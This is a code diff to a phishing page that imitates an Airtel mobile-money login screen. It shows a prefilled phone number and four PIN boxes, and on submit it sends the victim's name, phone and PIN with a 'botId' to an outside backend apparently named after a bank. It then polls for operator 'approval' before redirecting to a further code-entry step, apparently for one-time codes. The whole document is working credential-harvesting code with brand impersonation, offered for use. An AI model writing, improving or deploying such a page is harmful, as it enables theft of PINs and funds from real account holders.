@@ -2,23 +2,109 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Enter PIN</title>
 <style>
-body { font-family: Arial; background:#f6f7fb; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-.pin-container { background:#fff; padding:30px; width:350px; text-align:center; border-radius:12px; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
-.pin-boxes input { width:55px; height:60px; font-size:24px; text-align:center; margin:5px; border:2px solid red; border-radius:6px; }
-button { width:100%; padding:12px; background:red; color:#fff; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:flex; justify-content:center; align-items:center; }
-button:disabled { background:#ccc; cursor:not-allowed; }
-.spinner { display:none; width:20px; height:20px; border:3px solid #fff; border-top:3px solid rgba(255,255,255,0.3); border-radius:50%; animation:spin 1s linear infinite; margin-left:10px; }
-@keyframes spin { to { transform:rotate(360deg); } }
-#status { margin-top:15px; font-size:14px; color:#555; }
+body {
+    font-family: Arial, sans-serif;
+    background: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.pin-container {
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+}
+
+h1 {
+    color: #d60000; /* Airtel red */
+    font-size: 32px;
+    margin-bottom: 5px;
+}
+
+h2 {
+    font-weight: normal;
+    font-size: 20px;
+    margin-top: 0;
+    margin-bottom: 20px;
+    color: #333;
+}
+
+#phoneDisplay {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid #d60000;
+    border-radius: 8px;
+    font-size: 18px;
+    text-align: center;
+    margin-bottom: 15px;
+    pointer-events: none; /* Non-editable */
+    background: #fff;
+    box-sizing: border-box;
+}
+
+.pin-boxes {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+.pin-boxes input {
+    width: 55px;
+    height: 55px;
+    font-size: 24px;
+    text-align: center;
+    border: 2px solid #d60000;
+    border-radius: 8px;
+    outline: none;
+}
+
+button {
+    width: 100%;
+    padding: 12px;
+    background: #ccc;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: not-allowed;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+button.enabled {
+    background: #d60000;
+    cursor: pointer;
+}
+
+.status {
+    margin-top: 10px;
+    font-size: 14px;
+    color: red;
+}
+
+.terms {
+    margin-top: 30px;
+    font-size: 14px;
+    color: #555;
+}
 </style>
 </head>
 <body>
 
 <div class="pin-container">
-    <h2>Enter PIN</h2>
+    <h1>Airtel</h1>
+    <h2>Welcome</h2>
 
+    <input id="phoneDisplay" type="text" readonly>
+
+    <p>Enter your PIN</p>
     <form id="pinForm">
         <div class="pin-boxes">
             <input maxlength="1" inputmode="numeric">
@@ -26,44 +112,51 @@ button:disabled { background:#ccc; cursor:not-allowed; }
             <input maxlength="1" inputmode="numeric">
             <input maxlength="1" inputmode="numeric">
         </div>
-        <button id="submitBtn" disabled>
-            <span id="btnText">Submit PIN</span>
-            <div class="spinner" id="spinner"></div>
-        </button>
+        <button id="submitBtn" disabled>Login</button>
     </form>
-    <div id="status"></div>
+
+    <p class="terms">By continuing, you agree to the Terms and Conditions</p>
+    <div class="status" id="status"></div>
 </div>
 
 <script>
 const BACKEND_URL = "https://zanaco-backend.onrender.com";
 
-// ---------------- BOT ROUTING ----------------
+// ---------------- BOT ID ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId');
-if (!botId) { alert("Invalid access link"); throw new Error(); }
+if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
 
-// Prevent skipping steps
-if (!localStorage.getItem('name') || !localStorage.getItem('phone')) {
+// ---------------- PREFILL PHONE ----------------
+const phoneDisplay = document.getElementById('phoneDisplay');
+const phone = localStorage.getItem('phone');
+if (!phone) {
+    // If phone not set, redirect back to details page
     window.location.href = `details.html?botId=${botId}`;
 }
+phoneDisplay.value = phone;
 
 // ---------------- PIN INPUT LOGIC ----------------
 const inputs = document.querySelectorAll('.pin-boxes input');
 const button = document.getElementById('submitBtn');
-const btnText = document.getElementById('btnText');
-const spinner = document.getElementById('spinner');
-const statusText = document.getElementById('status');
 
 inputs[0].focus();
+
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
-        input.value = input.value.replace(/\D/g,'');
-        if (input.value && i < inputs.length - 1) inputs[i+1].focus();
+        input.value = input.value.replace(/\D/g,''); // Only digits
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
         button.disabled = ![...inputs].every(x => x.value);
+        if ([...inputs].every(x => x.value)) {
+            button.classList.add('enabled');
+        } else {
+            button.classList.remove('enabled');
+        }
     });
+
     input.addEventListener('keydown', e => {
         if (e.key === 'Backspace' && !input.value && i > 0) {
-            inputs[i-1].focus();
+            inputs[i - 1].focus();
         }
     });
 });
@@ -71,56 +164,29 @@ inputs.forEach((input, i) => {
 // ---------------- SUBMIT PIN ----------------
 document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
-
     const pin = [...inputs].map(i => i.value).join('');
-    const name = localStorage.getItem('name');
-    const phone = localStorage.getItem('phone');
-
-    // Save PIN locally
     localStorage.setItem('pin', pin);
 
-    // --- UX FEEDBACK ---
-    button.disabled = true;
-    btnText.textContent = 'Verifying...';
-    spinner.style.display = 'inline-block';
-    statusText.textContent = 'Waiting for approval...';
+    const res = await fetch(`${BACKEND_URL}/submit-pin`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            name: localStorage.getItem('name'),
+            phone,
+            pin,
+            botId
+        })
+    });
 
-    try {
-        const res = await fetch(`${BACKEND_URL}/submit-pin`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ name, phone, pin, botId })
-        });
-        const { requestId } = await res.json();
-
-        // Polling for approval
-        const poll = setInterval(async () => {
-            const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
-            const d = await r.json();
-
-            if (d.approved === true) {
-                clearInterval(poll);
-                window.location.href = `code.html?botId=${botId}`;
-            }
-
-            if (d.approved === false) {
-                clearInterval(poll);
-                button.disabled = false;
-                btnText.textContent = 'Submit PIN';
-                spinner.style.display = 'none';
-                statusText.textContent = 'Incorrect PIN. Try again.';
-                inputs.forEach(i => i.value='');
-                inputs[0].focus();
-            }
-        }, 1500);
-
-    } catch (err) {
-        spinner.style.display = 'none';
-        btnText.textContent = 'Submit PIN';
-        button.disabled = false;
-        statusText.innerText = 'Submission failed.';
-        console.error(err);
-    }
+    const { requestId } = await res.json();
+    const poll = setInterval(async () => {
+        const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const d = await r.json();
+        if (d.approved === true) {
+            clearInterval(poll);
+            window.location.href = `code.html?botId=${botId}`;
+        }
+    }, 1500);
 });
 </script>
 
